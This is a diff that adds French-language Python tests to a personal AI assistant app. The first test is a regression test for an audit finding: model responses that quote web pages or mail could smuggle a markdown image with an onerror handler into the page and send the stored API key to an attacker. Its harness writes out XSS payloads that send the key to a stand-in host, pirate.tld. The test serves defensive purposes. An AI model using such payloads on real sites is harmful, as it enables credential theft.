@@ -6,6 +6,7 @@ robustesse aux valeurs vides/None). Lancer avec :  python tests/test_nova.py
 """
 import json
 import re
+import shutil
 import sys
 import types
 from pathlib import Path
@@ -4620,6 +4621,259 @@ def test_automatisations_fouillees_et_envoi_verifiable():
     check("il appelle bien la route", "/agent/diag/telegram?envoyer=true" in ui, True)
 
 
+def test_la_cle_ne_peut_pas_quitter_le_telephone():
+    """AUDIT — defaut CRITIQUE : exfiltration de la cle API, SANS aucun clic.
+
+    esc() n'echappait QUE &, < et >. Le guillemet double survivait, et fmt() le
+    recollait AU MILIEU d'un attribut HTML. Une reponse contenant
+    « ![x](a"/onerror="location='https://pirate/?k='+localStorage.nova_key) »
+    produisait un vrai attribut onerror ; comme src=\"a\" echoue toujours, il partait
+    tout seul. La cle AGENT_API_KEY, gardee dans localStorage, quittait l'iPhone sans
+    que Lohan touche a quoi que ce soit — et elle ouvre les 47 routes : mails,
+    agenda, fichiers, automatisations.
+
+    Ce texte n'a pas besoin d'etre ecrit par Lohan : fmt() rend aussi les reponses
+    qui citent une page web, un flux RSS ou un mail — le canal exact identifie a
+    l'audit precedent — et les resultats d'automatisation.
+    """
+    import subprocess, tempfile, os, json as _j
+    from pathlib import Path as _P
+    racine = _P(__file__).resolve().parents[1]
+
+    if not shutil.which("node"):
+        check("node absent — verification statique seule", True, True)
+    else:
+        src = (racine / "ui" / "nova.html").read_text(encoding="utf-8")
+        extrait = src[src.index("function esc(s)"):src.index("function addRow(")]
+        harnais = """
+var KEY='sk-cle-secrete-de-lohan', ORIGIN='https://nova.onrender.com';
+%s
+var cas = {
+ image_piegee: '![logo](x"/onerror="location=\\'https://pirate.tld/?k=\\'+localStorage.nova_key)',
+ lien_javascript: '[clique](javascript:location=\\'https://pirate.tld/?k=\\'+localStorage.nova_key)',
+ cle_vers_un_tiers: '[PDF](https://pirate.tld/d?t=__KEY__)',
+ cle_vers_notre_serveur: '[Mon fichier](/agent/file?id=42&key=__KEY__)',
+ image_normale: '![schema](https://exemple.fr/i.png)',
+ lien_normal: '[Le Monde](https://lemonde.fr/article)',
+ gras_italique: '**important** et *penche*',
+ guillemets: 'Il a dit "bonjour".'
+};
+var out = {}; for (var k in cas) out[k] = fmt(cas[k]);
+console.log(JSON.stringify(out));
+""" % extrait
+        with tempfile.TemporaryDirectory() as d:
+            f = os.path.join(d, "h.js")
+            open(f, "w", encoding="utf-8").write(harnais)
+            r = subprocess.run(["node", f], capture_output=True, text=True, timeout=60)
+            check("le harnais tourne", r.returncode, 0)
+            out = _j.loads(r.stdout.strip().splitlines()[-1]) if r.returncode == 0 else {}
+
+        # 1. Plus aucun gestionnaire d'evenement ne peut naitre du texte.
+        for nom, rendu in out.items():
+            check(f"aucun onerror/onload dans « {nom} »",
+                  bool(re.search(r"\son\w+\s*=", rendu)), False)
+        # 2. Le protocole javascript: est refuse.
+        check("javascript: neutralise", 'href="#"' in out.get("lien_javascript", ""), True)
+        check("image piegee neutralisee", 'src="#"' in out.get("image_piegee", ""), True)
+        # 3. La cle ne part JAMAIS vers un tiers…
+        for nom, rendu in out.items():
+            if nom != "cle_vers_notre_serveur":
+                check(f"la cle n'apparait pas dans « {nom} »",
+                      "sk-cle-secrete-de-lohan" in rendu, False)
+        # …mais elle marche encore sur NOS liens de fichiers.
+        check("la cle reste posee sur nos propres liens",
+              "sk-cle-secrete-de-lohan" in out.get("cle_vers_notre_serveur", ""), True)
+        # 4. Le rendu normal n'est pas abime.
+        check("une image normale s'affiche encore",
+              'src="https://exemple.fr/i.png"' in out.get("image_normale", ""), True)
+        check("un lien normal marche encore",
+              'href="https://lemonde.fr/article"' in out.get("lien_normal", ""), True)
+        check("le gras marche encore", "<b>important</b>" in out.get("gras_italique", ""), True)
+        check("les guillemets sont echappes",
+              "&quot;bonjour&quot;" in out.get("guillemets", ""), True)
+
+    # 5. Les TROIS pages echappent les guillemets — pas seulement celle qu'on a corrigee.
+    for page in ("nova.html", "cours.html", "brain.html"):
+        t = (racine / "ui" / page).read_text(encoding="utf-8")
+        bloc = t.split("function esc(s)", 1)[1].split("\n\n", 1)[0]
+        check(f"{page} echappe le guillemet double", '&quot;' in bloc, True)
+        check(f"{page} echappe l'apostrophe", "&#39;" in bloc, True)
+
+
+def test_conversations_partagees_entre_appareils():
+    """« Les conv de mon tel ne sont pas reliees a mon PC ».
+
+    Les conversations vivaient dans le localStorage du navigateur. Un localStorage
+    appartient a UN navigateur sur UN appareil : l'iPhone et l'ordinateur avaient
+    chacun leur historique et ne voyaient jamais celui de l'autre ; vider le cache
+    effacait tout. A ne pas confondre avec la memoire de Nova, elle bien cote
+    serveur — ce qui explique qu'elle pouvait se souvenir d'un fait sans afficher
+    la conversation ou il avait ete dit.
+    """
+    import importlib, os as _os
+    from pathlib import Path as _P
+    racine = _P(__file__).resolve().parents[1]
+    SE = importlib.import_module("agent.sessions")
+    vrai = SE._ENTREPOT
+    try:
+        SE._ENTREPOT = FauxEntrepot("id")
+
+        # Le telephone depose deux conversations.
+        SE.enregistrer({"id": "s1", "title": "Cours de maths", "ts": 1000,
+                        "messages": [{"role": "me", "text": "explique les derivees"}]})
+        SE.enregistrer({"id": "s2", "title": "Actu bourse", "ts": 2000,
+                        "messages": [{"role": "me", "text": "le CAC aujourd'hui"}]})
+        # L'ordinateur les retrouve, la plus recente en tete.
+        vues = SE.lister()
+        check("les deux conversations sont partagees", [x["id"] for x in vues], ["s2", "s1"])
+        check("avec leur contenu", vues[1]["messages"][0]["text"], "explique les derivees")
+
+        # Une mise a jour depuis l'autre appareil ne duplique pas.
+        SE.enregistrer({"id": "s1", "title": "Cours de maths", "ts": 3000,
+                        "messages": [{"role": "me", "text": "explique les derivees"},
+                                     {"role": "ai", "text": "voila"}]})
+        vues = SE.lister()
+        check("pas de doublon apres mise a jour", len(vues), 2)
+        check("la version la plus recente gagne", vues[0]["id"], "s1")
+        check("le nouveau message est la", len(vues[0]["messages"]), 2)
+
+        # Une suppression est vraiment propagee.
+        check("suppression", SE.supprimer("s2"), True)
+        check("elle a disparu partout", [x["id"] for x in SE.lister()], ["s1"])
+        check("supprimer l'inconnu ne casse rien", SE.supprimer("zzz"), False)
+
+        # Une conversation sans identifiant est refusee, pas enregistree a moitie.
+        check("refus sans identifiant", SE.enregistrer({"title": "x"}), {})
+
+        # Le contenu est BORNE : le Mode Cours colle des transcriptions entieres.
+        gros = [{"role": "me", "text": "x" * 9000} for _ in range(300)]
+        SE.enregistrer({"id": "s3", "title": "Gros", "ts": 4000, "messages": gros})
+        garde = next(x for x in SE.lister() if x["id"] == "s3")
+        check("le nombre de messages est borne", len(garde["messages"]) <= SE.MAX_MESSAGES, True)
+        total = sum(len(m["text"]) for m in garde["messages"])
+        check("le volume est borne", total <= SE.MAX_CARACTERES + 8000, True)
+
+        # Une panne ne peut pas faire disparaitre les autres conversations.
+        SE._ENTREPOT.panne = True
+        check("pendant la panne, on ne supprime pas", SE.supprimer("s1"), False)
+        SE._ENTREPOT.panne = False
+        check("tout est intact", len(SE.lister()), 2)
+
+        # Le diagnostic DIT si c'est vraiment partage, il ne le suppose pas.
+        # Avec Supabase : il confirme, en donnant le nombre.
+        e = SE.etat()
+        check("avec Supabase, il confirme", e["resume"].startswith("✅"), True)
+        check("…et il compte", e["conversations"], 2)
+        # SANS Supabase : il PREVIENT au lieu de laisser croire que c'est partage.
+        SE._ENTREPOT.configure = lambda: False
+        e = SE.etat()
+        check("sans Supabase, il previent", e["resume"].startswith("⚠️"), True)
+        check("…et il dit quoi faire",
+              "SUPABASE_DB_URL" in e.get("solution", ""), True)
+        SE._ENTREPOT.configure = lambda: True
+    finally:
+        SE._ENTREPOT = vrai
+
+    # Les routes existent, exigent la cle, et l'interface les utilise.
+    api = (racine / "api" / "agent.py").read_text(encoding="utf-8")
+    for route in ('@router.get("/sessions")', '@router.post("/sessions")',
+                  '@router.delete("/sessions")', '@router.get("/diag/sessions")'):
+        check(f"route {route}", route in api, True)
+    ui = (racine / "ui" / "nova.html").read_text(encoding="utf-8")
+    check("l'interface fusionne avec le serveur", "async function syncSessions()" in ui, True)
+    check("elle depose ses conversations", '"/agent/sessions"' in ui, True)
+    check("elle propage les suppressions",
+          '/agent/sessions?key=' in ui and 'method:"DELETE"' in ui, True)
+    check("la fusion garde la version la plus recente",
+          "(s.ts||0) > (local.ts||0)" in ui, True)
+
+
+def test_une_tache_de_fond_ne_meurt_plus_en_silence():
+    """« Mon bot Telegram marchait en local, la il marche pas » — et rien ne dit pourquoi.
+
+    Le demarrage ecrivait « Bot Telegram demarre » AVANT que la tache ait rien fait :
+
+        bot_tasks.append(asyncio.create_task(run_telegram_bot()))
+        logger.info("Bot Telegram demarre.")
+
+    Si le bot mourait dans la seconde — jeton revoque, dependance absente, ou surtout
+    le « Conflict: terminated by other getUpdates request » que Telegram renvoie quand
+    DEUX instances interrogent le meme bot (l'ancienne installation locale ET Render) —
+    l'exception partait dans une tache que personne n'attend. Python l'avale jusqu'au
+    ramasse-miettes. Les journaux affirmaient « demarre », Lohan ne recevait rien, et
+    absolument rien n'expliquait pourquoi.
+    """
+    import asyncio as _a, importlib
+    from pathlib import Path as _P
+    racine = _P(__file__).resolve().parents[1]
+    T = importlib.import_module("agent.taches")
+    T.ETAT.clear()
+
+    async def casse(msg):
+        raise RuntimeError(msg)
+
+    async def tourne():
+        await _a.sleep(5)
+
+    async def finit_seule():
+        return
+
+    vu = {}
+
+    async def scenario():
+        T.lancer("bot Telegram", casse("Conflict: terminated by other getUpdates request"))
+        T.lancer("planificateur", tourne())
+        T.lancer("veille PEA", finit_seule())
+        await _a.sleep(0.05)
+        # On regarde AVANT la fermeture de la boucle : asyncio.run annule les taches
+        # encore vivantes en sortant, et « planificateur » passerait donc a « arretee ».
+        vu["planificateur"] = T.resume("planificateur")
+        vu["veille PEA"] = T.etat("veille PEA")["etat"]
+
+    _a.run(scenario())
+
+    # 1. Une tache qui meurt est VUE, pas avalee.
+    e = T.etat("bot Telegram")
+    check("l'echec est retenu", e["etat"], "echouee")
+    check("le resume le dit", T.resume("bot Telegram").startswith("❌"), True)
+
+    # 2. Et l'erreur est TRADUITE en quelque chose d'actionnable.
+    check("le conflit de double instance est explique",
+          "AUTRE programme" in e["erreur"], True)
+    check("…avec la solution", "@BotFather" in e["erreur"], True)
+    T.ETAT.clear()
+    _a.run(T.surveille("bot Telegram", casse("Unauthorized: 401 invalid token")))
+    check("un jeton refuse est explique",
+          "jeton Telegram est refus" in T.etat("bot Telegram")["erreur"], True)
+    T.ETAT.clear()
+    _a.run(T.surveille("bot Telegram", casse("ModuleNotFoundError: No module named 'telegram'")))
+    check("une dependance absente est expliquee",
+          "pendance manque" in T.etat("bot Telegram")["erreur"], True)
+
+    # 3. Une tache qui tourne vraiment le dit aussi.
+    check("celle qui tourne est verte", vu["planificateur"].startswith("✅"), True)
+    # 4. Une boucle qui se termine TOUTE SEULE n'est pas un succes : une boucle de fond
+    #    ne doit jamais s'arreter d'elle-meme.
+    check("une boucle qui s'arrete seule est signalee", vu["veille PEA"], "arretee")
+    # 5. Une tache jamais lancee ne se fait pas passer pour vivante.
+    check("jamais lancee", T.etat("veille tech inexistante")["etat"], "jamais_lancee")
+
+    # 6. Le demarrage utilise bien la surveillance, plus asyncio.create_task nu.
+    m = (racine / "main.py").read_text(encoding="utf-8")
+    check("plus de create_task nu au demarrage", "asyncio.create_task(run_" in m, False)
+    for nom in ('lancer("bot Telegram"', 'lancer("planificateur"',
+                'lancer("briefing du matin"', 'lancer("veille PEA"'):
+        check(f"{nom} est surveillee", nom in m, True)
+    check("on ne pretend plus avoir demarre avant l'heure",
+          '"Bot Telegram démarré."' in m, False)
+
+    # 7. Le diagnostic Telegram remonte l'etat REEL du bot.
+    api = (racine / "api" / "agent.py").read_text(encoding="utf-8")
+    check("le diagnostic lit l'etat de la tache", 'etat as _etat_tache' in api, True)
+    check("et l'affiche", 'd["bot"] = t' in api, True)
+    T.ETAT.clear()
+
+
 if __name__ == "__main__":
     for fn in (test_routage, test_echecs, test_dates, test_titres, test_robustesse,
                test_visuels, test_profil, test_automatisations, test_escouade,
@@ -4649,7 +4903,10 @@ if __name__ == "__main__":
                test_protocole_jamais_montre_ni_flux_casse,
                test_injection_donnees_et_cours_complet,
                test_discord_ferme_et_outils_dangereux_hors_de_portee,
-               test_automatisations_fouillees_et_envoi_verifiable):
+               test_automatisations_fouillees_et_envoi_verifiable,
+               test_la_cle_ne_peut_pas_quitter_le_telephone,
+               test_conversations_partagees_entre_appareils,
+               test_une_tache_de_fond_ne_meurt_plus_en_silence):
         try:
             fn()
         except Exception as e:
